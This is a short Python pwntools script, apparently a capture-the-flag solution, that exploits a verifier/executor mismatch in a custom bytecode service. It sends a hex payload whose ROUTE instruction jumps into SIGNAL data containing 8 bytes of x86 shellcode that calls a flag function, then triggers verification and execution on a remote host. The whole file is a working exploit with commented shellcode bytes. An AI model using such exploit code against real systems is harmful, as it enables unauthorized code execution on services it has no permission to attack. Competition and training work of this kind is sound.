# Verifier/executor differential: ROUTE jumps (translated-offset) into SIGNAL data (shellcode)
# that the verifier only bounds-checks in source-offset space.
# shellcode = mov eax,0x401bb0(flag fn); call rax; ret  -> b8 b0 1b 40 00 ff d0 c3
# source: ROUTE 30 02 | SIGNAL 20 <8 shellcode> | END 40
from pwn import *
context.log_level='info'
HEX='300220b8b01b4000ffd0c340'
io=remote('45.56.67.129',53916)
io.sendlineafter(b'> ',b'1')
io.sendlineafter(b'Hex transmission: ',HEX.encode())
io.sendlineafter(b'> ',b'3')   # verify
io.sendlineafter(b'> ',b'4')   # execute
data=io.recvuntil(b'execution completed',timeout=8)
print(data.decode('latin1',errors='replace'))
io.close()
